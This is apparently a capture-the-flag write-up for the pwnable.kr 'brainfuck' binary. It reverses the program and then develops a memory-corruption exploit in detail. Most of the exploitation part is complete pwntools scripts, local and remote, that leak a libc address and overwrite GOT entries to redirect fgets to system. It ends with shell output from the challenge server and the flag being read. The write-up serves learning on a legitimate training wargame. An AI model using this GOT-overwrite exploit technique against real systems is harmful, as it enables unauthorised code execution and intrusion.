# BRAINFUCK
this one was a bit challenging, let's dive in!

## Recon
once again there is no source code, only 2 files:
- `bf` - the program itself
- `bf_libc.so` - the `libc` used to compile the binary
we can run `checksec` on `bf` to see:
```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
We have `relro`,`stack-canary` and `NX`. Let's get to reversing!
## Reversing
I started by looking at the main function using `ghidra`:
```C

int main(void)

{
  size_t sVar1;
  int in_GS_OFFSET;
  uint local_418;
  char local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  p = tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(local_414,0,0x400);
  fgets(local_414,0x400,stdin);
  local_418 = 0;
  while( true ) {
     sVar1 = strlen(local_414);
     if (sVar1 <= local_418) break;
     do_brainfuck(local_414[local_418]);
     local_418 = local_418 + 1;
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                            /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return 0;
}
```
Doesn't look vulnerable...
- setting `p = tape;`
- takes a string of 1024 chars
- It calls `do_brainfuck` on each char tho. Let's take a look:
```C
void do_brainfuck(char param)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = p;
  switch(param) {
  case '+':
     *p = *p + '\x01';
     break;
  case ',':
     iVar2 = getchar();
     *pcVar1 = (char)iVar2;
     break;
  case '-':
     *p = *p + -1;
     break;
  case '.':
     putchar((int)*p);
     break;
  case '<':
     p = p + -1;
     break;
  case '>':
     p = p + 1;
     break;
  case '[':
     puts("[ and ] not supported.");
  }
  return;
}
```
As we can see, this an interpreter for a language  like `brainfuck`. example `hello-world` program in `brainfuck` looks like this:
```
>++++++++[<+++++++++>-]<.>++++[<+++++++>-]<+.+++++++..+++.>>++++++[<+++++++>-]<+
+.------------.>++++++[<+++++++++>-]<+.<.+++.------.--------.>>>++++[<++++++++>-
]<+.
```
Let's get back to the code. as we can see, every char is an instruction (I will only do what matters):
- `>` add `1` to the pointer location
- `<` sub `1` from the pointer location
- `.` print one char of the buffer
- `,` read from `stdin` a char and write it to the buffer

basically we have a super nice Write-What-Where! we can modify the pointer to point to any where we want, then write what we need! we can also leak values with our read primitive!

## Exploitation
To exploit this I had to do some thinking. I remembered the `GOT` table which I know I can override to change functions.
let's look at the functions we are using:
- in `main`
	- `memset`
	- `fgets`
- in `do_brainfuck`
	- `putchar`
So my idea is:
- leak the `fgets` function address (from the `GOT`) to get the offset.
- use the offset to calculate `system` function address.
- change the `GOT` table so `fgets` will point to `system` - will allow us to run what command which is in the buffer.
- change the `GOT` table so `memset` will point to `gets` - will allow us to change the buffer.
- change the `GOT` table so `putchar` will point to `main` - will allow us to use our changed values to exploit the program.

Let's develop a script!

## Exploit development - local testing
import `pwn` tools:
```python
from pwn import *
context.log_level = 'error'
```
create  a class of the instructions:
```python
class INSTRUCTIONS:
	MOVE_RIGHT = b">"
	MOVE_LEFT = b"<"
	READ = b"."
	WRITE = b","
```
load the `elf` and the `libc` and create a `process`:
```python
e = ELF("./bf")
# libc = ELF("./bf_libc.so") - use this for remote exploit
libc = ELF("/lib/i386-linux-gnu/libc.so.6") # use this for local exploit
p = e.process()
```
read the shit the program is yelling:
```python
p.recvuntil(b"type some brainfuck instructions except [ ]\n")
```
as we know, the `tape` symbol is the buffer starting location. now let's build our payload, remember we have 4 parts:
- leaking the address of `fgets`
- changing the got: `fgets` -> `system`
- changing the got: `memset` -> `gets`
- changing the got: `putchar` -> `main`
```python
payload = b''

# change the pointer to be at the GOT['fgets']
payload += INSTRUCTIONS.MOVE_LEFT * (e.sym["tape"] - e.got["fgets"])
# read 4 bytes (leak the address)
payload += (INSTRUCTIONS.READ + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4

# rewrite the got address of `fgets` to `system`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4

# change the pointer to be at the GOT['memset']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["memset"] - e.got["fgets"])
# rewrite the got address of `memset` to `fgets`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4

# change the pointer to be at the GOT['putchar']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["putchar"] - e.got["memset"])
# rewrite the got address of `putchar` to `main`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4

# get back to main
payload += INSTRUCTIONS.READ
```
Now, we can send the payload, and get our leak:
```python
p.sendline(payload)
fgets_addr = u32(p.recv(4))
print("Leaked fgets address:", hex(fgets_addr))
```
use it to calculate the offset, the `gets` and `system` real addresses:
```python
offset = fgets_addr - libc.symbols["fgets"]
print("Offset is: ", offset)

system_addr = libc.symbols['system'] + offset
gets_addr = libc.symbols['gets'] + offset
print("System:", hex(system_addr))
print("Gets:", hex(gets_addr))
```
then we can send all the addresses:
```python
p.send(p32(system_addr))
p.send(p32(gets_addr))
p.send(p32(e.symbols['main']))
```
then we can just send `/bin/sh` and get a shell!
```python
p.sendline(b"/bin/sh")
p.interactive()
```
So, `local_exploit.py` should look like this:
```python
from pwn import *

context.log_level = 'error'

class INSTRUCTIONS:
    MOVE_RIGHT = b">"
    MOVE_LEFT = b"<"
    READ = b"."
    WRITE = b","

e = ELF("./bf")
# libc = ELF("./bf_libc.so")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p = e.process()


p.recvuntil(b"type some brainfuck instructions except [ ]\n")

payload = b''
# change the pointer to be at the GOT['fgets']
payload += INSTRUCTIONS.MOVE_LEFT * (e.sym["tape"] - e.got["fgets"])
# read 4 bytes
payload += (INSTRUCTIONS.READ + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4
# rewrite the got address of `fgets` to `system`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4
# change the pointer to be at the GOT['memset']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["memset"] - e.got["fgets"])
# rewrite the got address of `memset` to `fgets`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4

# change the pointer to be at the GOT['putchar']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["putchar"] - e.got["memset"])
# rewrite the got address of `putchar` to `main`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# get to main
payload += INSTRUCTIONS.READ


p.sendline(payload)
fgets_addr = u32(p.recv(4))
print("Leaked fgets address:", hex(fgets_addr))
offset = fgets_addr - libc.symbols["fgets"]
print("Offset is: ", offset)

system_addr = libc.symbols['system'] + offset
gets_addr = libc.symbols['gets'] + offset

print("System:", hex(system_addr))
print("Gets:", hex(gets_addr))

p.send(p32(system_addr))
p.send(p32(gets_addr))
p.send(p32(e.symbols['main']))

p.sendline(b"/bin/sh")
p.interactive()
```
Let's run it:
```sh
python3 local_exploit.py
```
And:
```
Leaked fgets address: 0xf7dca390
Offset is:  0xf7d57000
System: 0xf7da3910
Gets: 0xf7dcb550
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ ls -la
total 4232
drwxr-xr-x  2 ido ido    4096 Oct 26 10:17 .
drwxr-xr-x 23 ido ido    4096 Oct 26 05:28 ..
-rwxr-xr-x  1 ido ido    7713 May 15  2019 bf
-rw-r--r--  1 ido ido 1790580 Apr 12  2022 bf_libc.so
-rw-------  1 ido ido 2801664 Oct 26 09:40 core
-rw-------  1 ido ido      19 Oct 26 05:30 .gdb_history
-rw-r--r--  1 ido ido    1772 Oct 26 10:24 local_exploit.py
-rw-r--r--  1 ido ido    1344 Oct 26 09:41 test.py
$
```
We have a shell!
## Remote exploit:
we just need to change the `libc` to be the one we got, and to connect to the remote server.
**NOTICE** i added a sleep before receiving from the server, because it is slow.
the full exploit:
```python
from pwn import *

context.log_level = 'error'

class INSTRUCTIONS:
    MOVE_RIGHT = b">"
    MOVE_LEFT = b"<"
    READ = b"."
    WRITE = b","

e = ELF("./bf")
libc = ELF("./bf_libc.so")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p = remote("pwnable.kr", 9001)


p.recvuntil(b"type some brainfuck instructions except [ ]\n")

payload = b''
# change the pointer to be at the GOT['fgets']
payload += INSTRUCTIONS.MOVE_LEFT * (e.sym["tape"] - e.got["fgets"])
# read 4 bytes
payload += (INSTRUCTIONS.READ + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4
# rewrite the got address of `fgets` to `system`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4
# change the pointer to be at the GOT['memset']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["memset"] - e.got["fgets"])
# rewrite the got address of `memset` to `fgets`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# reset the possition
payload += INSTRUCTIONS.MOVE_LEFT * 4

# change the pointer to be at the GOT['putchar']
payload += INSTRUCTIONS.MOVE_RIGHT * (e.got["putchar"] - e.got["memset"])
# rewrite the got address of `putchar` to `main`
payload += (INSTRUCTIONS.WRITE + INSTRUCTIONS.MOVE_RIGHT) * 4
# get to main
payload += INSTRUCTIONS.READ


p.sendline(payload)
time.sleep(1)
fgets_addr = u32(p.recv(4))
print("Leaked fgets address:", hex(fgets_addr))
offset = fgets_addr - libc.symbols["fgets"]
print("Offset is: ", hex(offset))

system_addr = libc.symbols['system'] + offset
gets_addr = libc.symbols['gets'] + offset

print("System:", hex(system_addr))
print("Gets:", hex(gets_addr))

p.send(p32(system_addr))
p.send(p32(gets_addr))
p.send(p32(e.symbols['main']))

p.sendline(b"/bin/sh")
p.interactive()
```
And we get a shell!
```
Leaked fgets address: 0xf7593160
Offset is:  0xf7535000
System: 0xf756fdb0
Gets: 0xf75943f0
welcome to brainfuck testing system!!
type some brainfuck instructions except [ ]
$ ls -la
total 34532
drwxr-x---   3 root brainfuck     4096 Sep 13  2018 .
drwxr-xr-x 116 root root          4096 Oct 30  2023 ..
d---------   2 root root          4096 Jun 12  2014 .bash_history
-r-xr-x---   1 root brainfuck     7713 Jun 10  2014 brainfuck
-r--r-----   1 root brainfuck       35 Jun 10  2014 flag
-rwxr-xr-x   1 root root       1790580 Apr 12  2022 libc-2.23.so
-rw-------   1 root brainfuck 33530526 Oct 26 10:27 log
-rwx------   1 root brainfuck      777 Oct 23  2016 super.pl
$ cat flag
BrainFuck? what a weird language..
$  
```
Good Game!
